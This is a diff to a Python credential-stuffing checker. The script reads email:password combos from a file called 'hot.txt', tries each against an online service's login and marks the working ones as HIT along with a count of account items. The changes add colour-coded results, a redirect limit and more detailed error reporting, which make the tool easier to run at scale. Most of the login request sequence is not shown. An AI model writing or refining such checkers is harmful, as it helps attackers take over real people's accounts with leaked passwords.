@@ -3,12 +3,16 @@ import json
 import re
 from urllib.parse import quote
 from bs4 import BeautifulSoup
+from colorama import init, Fore, Style
+
+# Initialize colorama for cross-platform color support
+init(autoreset=True)
 
 def url_encode(s):
     return quote(s)
 
 def parse_lr(text, left, right):
-    pattern = f"{re.escape(left)}(.*?){re.escape(right)}"
+    pattern = re.escape(left) + "(.*?)" + re.escape(right)
     match = re.search(pattern, text, re.DOTALL)
     return match.group(1) if match else ""
 
@@ -19,6 +23,8 @@ def parse_css(html, selector, attribute):
 
 def check_account(email, password):
     session = requests.Session()
+    # Set a maximum number of redirects to prevent excessive redirects
+    session.max_redirects = 10
 
     try:
         # Request 1
@@ -311,9 +317,12 @@ def check_account(email, password):
         total = json.loads(response.text)["EntitySets"][0]["Total"]
         return f"HIT ({total})"
 
+    except requests.exceptions.TooManyRedirects:
+        return "ERROR: Too many redirects"
+    except requests.exceptions.RequestException as e:
+        return f"ERROR: {str(e)}"
     except Exception as e:
-        print(f"Error occurred: {str(e)}")
-        return "BAD"
+        return f"ERROR: {str(e)}"
 
 def main():
     with open("hot.txt", "r") as f:
@@ -322,7 +331,17 @@ def main():
     for i, combo in enumerate(combos, 1):
         email, password = combo.strip().split(":")
         result = check_account(email, password)
-        print(f"{i}. {email}:{password} => STATUS: {result}")
+        
+        if result.startswith("HIT"):
+            color = Fore.GREEN
+        elif result == "LOCKED":
+            color = Fore.YELLOW
+        elif result.startswith("ERROR"):
+            color = Fore.MAGENTA
+        else:
+            color = Fore.RED
+        
+        print(f"{i}. {email}:{password} => STATUS: {color}{result}{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     main()
